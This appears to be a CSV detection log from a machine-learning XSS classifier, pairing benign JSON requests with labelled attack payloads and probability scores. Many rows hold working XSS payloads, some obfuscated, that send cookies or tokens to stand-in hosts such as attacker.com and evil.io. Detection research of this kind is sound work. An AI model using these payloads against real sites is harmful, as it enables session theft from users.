Data/Hora,IP,Payload,Indicadores_XSS,Classificacao,Probabilidade_Ataque_IA,Tipo_Deteccao
2026-05-11T16:00:01.001-03:00,192.168.1.10,"{""user"":""gabriel_ifsp"",""action"":""login"",""timestamp"":1715454001}",0,NORMAL,3.8%,(Normal)
2026-05-11T16:00:02.122-03:00,10.0.0.5,"{""nome"":""<img src=x onerror='fetch(\""http://evil.io/\""+btoa(document.cookie))'>""}",11,ATAQUE,99.2%,(Regex_Redundante)
2026-05-11T16:00:03.455-03:00,172.16.0.1,"{""search"":""como integrar scikit-learn com tensorflow"",""page"":2,""tags"":[""python"",""ml""]}",0,NORMAL,27.8%,(Normal)
2026-05-11T16:00:04.988-03:00,189.55.1.4,"{""comment"":""<svg/onload='document.location=\""http://attacker.com/steal?token=\""+localStorage.getItem(\""token\"")'>""}",9,ATAQUE,82.4%,(Regex_Redundante)
2026-05-11T16:00:05.111-03:00,192.168.1.15,"{""config"":{""theme"":""dark"",""lang"":""pt-BR"",""fontSize"":14}}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:00:06.222-03:00,10.0.0.8,"{""payload"":""<script>navigator.sendBeacon(\""http://malware.org/log\"",document.cookie)</script>""}",13,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T15:00:07.333-03:00,177.44.22.10,"{""nome"":""João Conceição de Araújo"",""bio"":""Estudante de Engenharia no IFSP campus São Paulo.""}",0,NORMAL,62.3%,(Normal)
2026-05-11T16:00:08.444-03:00,187.1.55.99,"{""nome"":""<details open ontoggle=eval(atob('ZmV0Y2goImh0dHA6Ly9hdHRhY2tlci5jb20vIitkb2N1bWVudC5jb29raWUp'))>""}",7,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:00:09.555-03:00,192.168.0.100,"{""status"":""OK"",""uptime"":""15 days"",""load"":[0.1, 0.5, 0.2]}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:00:10.666-03:00,10.0.0.12,"{""msg"":""<body/onpageshow=fetch('http://phish.me/'+document.cookie)>""}",9,ATAQUE,93.1%,(Regex_Redundante)
2026-05-11T16:00:11.777-03:00,172.16.1.1,"{""file_path"":""C:\\Users\\Public\\Documents\\relatorio_v3.pdf"",""size_kb"":2048}",0,NORMAL,91.8%,(Normal)
2026-05-11T16:00:12.888-03:00,189.10.20.30,"{""xss"":""<audio src/onerror='new(Image).src=\""http://evil.com/\""+document.cookie'>""}",10,ATAQUE,99.8%,(Regex_Redundante)
2026-05-11T16:00:13.999-03:00,10.0.0.1,"{""request"":{""id"":""f47ac10b-58cc-4372-a567-0e02b2c3d479"",""method"":""POST""}}",0,NORMAL,18.1%,(Normal)
2026-05-11T16:00:14.111-03:00,177.88.99.1,"{""nome"":""<input onfocus=window.location='http://attacker.com/' autofocus>""}",5,ATAQUE,94.4%,(Random_Forest)
2026-05-11T16:00:18.555-03:00,189.33.22.11,"{""payload"":""<marquee onstart='fetch(\""http://attacker.com/\""+document.cookie)'>""}",9,ATAQUE,94.8%,(Regex_Redundante)
2026-05-11T16:00:16.333-03:00,10.0.0.5,"{""nome"":""<video><source onerror=\""eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,39,41))\""></video>""}",11,ATAQUE,98.7%,(Regex_Redundante)
2026-05-11T16:00:15.222-03:00,192.168.1.1,"{""feedback"":""Achei o campo de busca meio confuso, mas os resultados são bons.""}",0,NORMAL,51.7%,(Normal)
2026-05-11T16:00:17.444-03:00,172.16.0.40,"{""auth"":{""type"":""Bearer"",""token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...""}}",0,NORMAL,29.1%,(Normal)
2026-05-11T16:00:19.666-03:00,192.168.1.50,"{""item"":{""id"":99,""name"":""Teclado Mecânico"",""price"":250.00,""stock"":true}}",0,NORMAL,3.9%,(Normal)
2026-05-11T16:00:20.777-03:00,10.0.0.10,"{""nome"":""<table background='javascript:fetch(\""http://evil.com\"")'></table>""}",8,ATAQUE,94.4%,(Regex_Redundante)
2026-05-11T16:00:21.888-03:00,177.11.22.33,"{""msg"":""Olá, gostaria de saber o prazo de entrega para o CEP 01001-000.""}",0,NORMAL,50.5%,(Normal)
2026-05-11T16:00:22.999-03:00,192.168.0.5,"{""nome"":""<link rel='import' href='http://evil.com/xss.html'>""}",6,ATAQUE,93.0%,(Random_Forest)
2026-05-11T16:00:23.111-03:00,10.0.0.2,"{""log"":""API Gateway: Request processed in 45ms""}",0,NORMAL,9.8%,(Normal)
2026-05-11T16:00:24.222-03:00,189.99.88.77,"{""xss"":""<a href='javascript:void(fetch(\""http://attacker.com/\""+document.cookie))'>Click</a>""}",14,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:00:25.333-03:00,172.16.5.5,"{""data"":{""temp"":24.5,""hum"":60,""loc"":""Laboratório 4""}}",0,NORMAL,1.1%,(Normal)
2026-05-11T16:00:26.444-03:00,10.0.0.8,"{""css"":""<style>@import 'http://evil.com/xss.css';</style>""}",5,ATAQUE,92.4%,(Random_Forest)
2026-05-11T16:00:27.555-03:00,192.168.1.5,"{""query"":""SELECT name FROM users WHERE id = 10""}",0,NORMAL,83.6%,(Normal)
2026-05-11T16:00:28.666-03:00,189.1.1.1,"{""nome"":""<object data='javascript:fetch(\""http://evil.com\"")'></object>""}",8,ATAQUE,93.1%,(Regex_Redundante)
2026-05-11T16:00:29.777-03:00,177.55.44.33,"{""text"":""Muito bom o projeto final de curso, excelente abordagem de ML.""}",0,NORMAL,49.1%,(Normal)
2026-05-11T16:00:30.888-03:00,10.0.0.20,"{""nome"":""<embed src='javascript:console.log(document.cookie)'></embed>""}",10,ATAQUE,94.8%,(Regex_Redundante)
2026-05-11T16:00:31.999-03:00,192.168.1.100,"{""tags"":[""cybersecurity"",""deep-learning"",""xss-detection""]}",1,NORMAL,63.0%,(Normal)
2026-05-11T16:00:32.111-03:00,10.0.0.3,"{""comment"":""<form id='x' /><button form='x' formaction='javascript:fetch(\""//attacker.com\"")'>Post</button>""}",7,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:00:33.222-03:00,172.16.0.2,"{""search"":""livros de George Orwell 1984"",""available"":true}",0,NORMAL,8.6%,(Normal)
2026-05-11T16:00:34.333-03:00,189.2.2.2,"{""nome"":""<isindex formaction='javascript:fetch(\""http://evil.com\"")' type='submit'>""}",8,ATAQUE,99.6%,(Regex_Redundante)
2026-05-11T16:00:35.444-03:00,10.0.0.15,"{""system_info"":{""os"":""Windows 11"",""arch"":""x64"",""version"":""22H2""}}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:00:36.555-03:00,192.168.1.25,"{""nome"":""<keygen onfocus='window.location=\""http://attacker.com/\""'>""}",5,ATAQUE,93.1%,(Random_Forest)
2026-05-11T16:00:37.666-03:00,177.0.0.1,"{""cart_summary"":{""total"":159.90,""items_count"":2}}",0,NORMAL,1.1%,(Normal)
